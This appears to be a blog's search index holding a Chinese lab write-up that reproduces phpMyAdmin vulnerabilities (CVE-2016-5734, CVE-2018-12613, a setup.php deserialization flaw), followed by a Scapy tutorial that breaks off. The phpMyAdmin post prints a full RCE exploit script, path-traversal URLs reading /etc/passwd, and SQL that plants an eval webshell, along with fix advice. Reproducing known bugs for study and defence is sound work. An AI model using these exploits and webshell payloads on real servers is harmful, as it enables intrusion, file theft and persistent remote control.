<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpMyAdmin系列漏洞</title>
      <link href="/posts/38924/"/>
      <url>/posts/38924/</url>
      
        <content type="html"><![CDATA[<h3 id="phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）"><a href="#phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞（CVE-2016-5734）" class="headerlink" title="phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）"></a>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进<code>preg_replace</code>函数第一个参数中。<br>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li><code>4.0.10.16</code>之前<code>4.0.x</code>版本</li><li><code>4.4.15.7</code>之前<code>4.4.x</code>版本</li><li><code>4.6.3</code>之前<code>4.6.x</code>版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li></ul><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>编辑一个<code>grep_replace.php</code>文件，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$raw</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;raw&#x27;</span>];</span><br><span class="line">    <span class="variable">$replace</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;replace&#x27;</span>];</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$text</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$raw</span>.<span class="string">&#x27;/e&#x27;</span>, <span class="variable">$replace</span>, <span class="variable">$text</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将该文件放置在网站的根目录下，访问<code>http://your-ip//preg_replace.php??raw=a&amp;replace=system(&quot;whoami&quot;)&amp;text=aaa</code>，即可看到执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    $raw = $_GET[&#x27;raw&#x27;];</span><br><span class="line">    $replace = $_GET[&#x27;replace&#x27;];</span><br><span class="line">    $text = $_GET[&#x27;text&#x27;];</span><br><span class="line"></span><br><span class="line">    $text = preg_replace(&#x27;/&#x27;.$raw.&#x27;/e&#x27;, $replace, $text);</span><br><span class="line">?&gt; desktop-e5nsaug\test desktop-e5nsaug\test desktop-e5nsaug\test</span><br></pre></td></tr></table></figure><p> 访问<code>http://your-ip:8080</code>，即可看到phpMyAdmin的登录页面。使用<code>root</code>:<code>root</code>登录。<br>用此<a href="'https://www.exploit-db.com/exploits/40185/'">POC脚本</a> 来复现漏洞。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cve-2016-5734.py -c &#x27;system(id);&#x27; -u root -p root -d test http://your-ip:8080/</span><br></pre></td></tr></table></figure><p>-d是已经可以写的数据库，-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为<code>prgpwn</code>的表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">            <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                        <span class="built_in">print</span>(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;goto&quot;</span>: <span class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">            <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li><p>升级phpMyAdmin<br>将受影响的phpMyAdmin版本升级到最新版本。最新版本可以从phpMyAdmin官方网站下载。</p></li><li><p>限制访问权限<br>为了降低攻击风险，仅允许授权用户访问phpMyAdmin，并且不要将phpMyAdmin暴露在公共网络中。</p></li><li><p>使用Web应用防火墙<br>可以使用Web应用防火墙（WAF）来阻止攻击者利用漏洞进行攻击。WAF可以检测并拦截来自攻击者的恶意请求。</p></li></ol><h3 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成 远程文件包含漏洞。</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p><code>phpMyAdmin 4.8.0</code>和<code>4.8.1</code>。</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>http://your-ip:8080</code>，即可进入phpmyadmin。因配置的是<code>config</code>模式，所以无需输入密码，直接登录后台。</p><p>访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，可见<code>/etc/passwd</code>被读取，说明文件包含漏洞存在。</p><p><strong>利用方式一：</strong><br>可以执行一下<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件。然后<br>访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_XXXXXX</code>，即可看到phpinfo。<br>通过测试发现此方式无法包含一句话木马，可能因为对内容进行了一些过滤和处理。<br><strong>利用方式二：</strong><br>mysql5.0以上会创建日志文件，可以通过修改日志文件的路径，然后写入一句话木马，再包含日志文件，即可执行木马。<br>查看日志状态：<code>show variables like &#39;%log%&#39;;</code><br>开启日志：<code>set global general_log=on;</code><br>设置日志路径：<code>set global general_log_file=&#39;/指定路径/1.php&#39;;</code><br>此方法需要有SUPER权限权限，否则会报错。而在站库分离的情况下，数据库文件存储在数据库服务器上，而phpmyadmin在web服务器上，所以无法进行文件包含。<br><strong>利用方式三：</strong><br>将木马写入到数据库字段中，然后包含数据库文件，即可执行木马。<br>查看数据库文件路径：<code>show variables like &#39;%datadir%&#39;;</code><br>新建一个test表，然后将木马写入到字段中。<br>最后将数据库文件包含进来。<br><code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/test.frm</code><br>mysql后面跟&#x2F;db_name&#x2F;table_name.frm，即可包含数据库文件。<br>站库分离的情况下，数据库文件存储在数据库服务器上，而phpmyadmin在web服务器上，所以无法进行文件包含。</p><p><strong>利用方式四：</strong><br>利用<code>file_put_contents()</code>函数写入一句话木马，然后通过访问session文件包含木马，即可执行木马。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;&#x27;)?&gt;&quot;;</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_XXXXXX</code>之后生成1.php，然后再访问<code>http://your-ip:8080/1.php</code>，即可发现写入成功，蚁剑连接即可。</p><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>升级phpMyAdmin</li><li>限制phpMyAdmin访问</li></ol><h3 id="phpmyadmin-scripts-x2F-setup-php-反序列化漏洞（WooYun-2016-199433）"><a href="#phpmyadmin-scripts-x2F-setup-php-反序列化漏洞（WooYun-2016-199433）" class="headerlink" title="phpmyadmin scripts&#x2F;setup.php 反序列化漏洞（WooYun-2016-199433）"></a>phpmyadmin scripts&#x2F;setup.php 反序列化漏洞（WooYun-2016-199433）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p>phpMyAdmin 2.x版本</p><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>发送如下数据包，即可读取<code>/etc/passwd</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 80</span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.mottoin.com/4cb63e7c-9151-42da-a5bd-e6e29e7ff2f8/index.html">PhpMyAdmin某版本无需登录任意文件包含导致代码执行(可getshell)漏洞分析</a></p><h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>尽快升级到最新版</li><li>将setup.php中28行中的”configuration”改为传入其他值</li><li>直接删除scripts目录，防止被恶意攻击。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scapy基础学习</title>
      <link href="/posts/47293/"/>
      <url>/posts/47293/</url>
      
        <content type="html"><![CDATA[<h3 id="Scapy入门"><a href="#Scapy入门" class="headerlink" title="Scapy入门"></a>Scapy入门</h3><blockquote><p>Scapy是一个Python程序，它允许用户发送、嗅探、分析和伪造网络包。这种能力允许构建能够探测、扫描或攻击网络的工具。</p><p>中文文档：<code>https://www.osgeo.cn/scapy/index.html</code></p></blockquote><p>下载Scapy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scapy</span><br></pre></td></tr></table></figure><ul><li>Windows需要安装<a href="https://npcap.com/#download">Npcap</a></li><li>Linux确保安装了tcpdump<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install tcpdump</span><br></pre></td></tr></table></figure>在终端输入<code>scapy</code>即可进入交互式命令行<br><img src="https://image.jh2ing.com/20230512111911.png" alt="20230512111911"></li></ul><h3 id="Scapy基本操作"><a href="#Scapy基本操作" class="headerlink" title="Scapy基本操作"></a>Scapy基本操作</h3><p>在Scapy中，<code>ls()</code>函数用于列出当前可用的网络协议和数据包。<br>如果想查看可用的TCP选项，可以使用<code>ls(TCP)</code>。</p><h4 id="构建一个IP数据包"><a href="#构建一个IP数据包" class="headerlink" title="构建一个IP数据包"></a>构建一个IP数据包</h4><ol><li>首先查看<code>IP()</code>类中的属性。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">ls</span>(IP)</span></span><br><span class="line">version    : BitField  (4 bits)                  = (&#x27;4&#x27;)</span><br><span class="line">ihl        : BitField  (4 bits)                  = (&#x27;None&#x27;)</span><br><span class="line">tos        : XByteField                          = (&#x27;0&#x27;)</span><br><span class="line">len        : ShortField                          = (&#x27;None&#x27;)</span><br><span class="line">id         : ShortField                          = (&#x27;1&#x27;)</span><br><span class="line">flags      : FlagsField                          = (&#x27;&lt;Flag 0 ()&gt;&#x27;)</span><br><span class="line">frag       : BitField  (13 bits)                 = (&#x27;0&#x27;)</span><br><span class="line">ttl        : ByteField                           = (&#x27;64&#x27;)</span><br><span class="line">proto      : ByteEnumField                       = (&#x27;0&#x27;)</span><br><span class="line">chksum     : XShortField                         = (&#x27;None&#x27;)</span><br><span class="line">src        : SourceIPField                       = (&#x27;None&#x27;)</span><br><span class="line">dst        : DestIPField                         = (&#x27;None&#x27;)</span><br><span class="line">options    : PacketListField                     = (&#x27;[]&#x27;)</span><br></pre></td></tr></table></figure></li><li>设置属性值<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; IP(dst=<span class="string">&quot;192.168.0.1&quot;</span>,ttl=64)</span></span><br><span class="line">&lt;IP  ttl=64 dst=192.168.0.1 |&gt;</span><br></pre></td></tr></table></figure><h4 id="采用分层的形式来构造数据包"><a href="#采用分层的形式来构造数据包" class="headerlink" title="采用分层的形式来构造数据包"></a>采用分层的形式来构造数据包</h4>一个数据包是由多层协议组合而成，Scapy中实现多层协议通过符号<code>/</code>分层实现，协议之间使用<code>/</code>分开，按照从下往上从左往右排列，如<code>Ether()/IP()/TCP()</code>。<br>构造一个完整的HTTP数据包：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a=Ether()/IP(dst=<span class="string">&quot;www.slashdot.org&quot;</span>)/TCP()/<span class="string">&quot;GET /index.html HTTP/1.0 \n\n&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; b=raw(a)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; c=Ether(b)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; c</span></span><br><span class="line">&lt;Ether  dst=cc:08:fb:ea:3f:71 src=f8:e4:3b:e3:98:17 type=IPv4 |&lt;IP  version=4 ihl=5 tos=0x0 len=67 id=1 flags= frag=0 ttl=64 proto=tcp chksum=0x34e6 src=192.168.0.190 dst=104.18.28.86 |&lt;TCP  sport=ftp_data dport=http seq=0 ack=0 dataofs=5 reserved=0 flags=S window=8192 chksum=0x77e3 urgptr=0 |&lt;Raw  load=&#x27;GET /index.html HTTP/1.0 \n\n&#x27; |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>变量a是一个Scapy数据包对象，其中包含了以太网帧、IP数据包、TCP分段和HTTP请求的数据。<br>b &#x3D; raw(a)从Scapy数据包对象a中提取原始字节流。raw()方法将数据包序列化为可以在网络上传输的字节流格式。<br>c &#x3D; Ether(b)的目的是在序列化后的数据包b周围创建一个以太网帧。这是必要的，因为当我们在局域网上发送数据包时，它们需要封装在一个以太网 帧中，其中包括源设备和目标设备的硬件地址（MAC地址）。<br>因此，通过将序列化后的数据包b嵌入到以太网帧中创建了c。然后可以将结果数据包发送到网络上。</p></blockquote></li></ol><p>python代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 